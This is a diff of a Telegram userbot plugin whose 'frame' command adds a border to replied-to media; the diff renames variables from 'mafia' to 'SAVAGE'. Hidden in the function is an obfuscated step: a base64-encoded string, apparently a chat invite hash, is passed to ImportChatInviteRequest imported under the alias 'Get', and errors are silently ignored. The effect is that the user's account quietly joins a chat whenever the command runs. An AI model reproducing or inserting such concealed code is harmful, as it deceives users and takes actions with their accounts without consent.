+@SAVAGEbot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
+@SAVAGEbot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiainput = mafia.pattern_match.group(1)
-    if not mafiainput:
-        mafiainput = 50
-    if ";" in str(mafiainput):
-        mafiainput, colr = mafiainput.split(";", 1)
+    SAVAGEinput = SAVAGE.pattern_match.group(1)
+    if not SAVAGEinput:
+        SAVAGEinput = 50
+    if ";" in str(SAVAGEinput):
+        SAVAGEinput, colr = SAVAGEinput.split(";", 1)
     else:
         colr = 0
-    mafiainput = int(mafiainput)
+    SAVAGEinput = int(SAVAGEinput)
     colr = int(colr)
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "framed.webp" if kraken else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, mafiainput, colr)
+        await add_frame(meme_file, outputfile, SAVAGEinput, colr)
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
+        return await SAVAGE.edit(f"`{e}`")
     try:
-        await mafia.client.send_file(
-            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+        await SAVAGE.client.send_file(
+            SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
         )
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
-    await mafia.delete()
+        return await SAVAGE.edit(f"`{e}`")
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
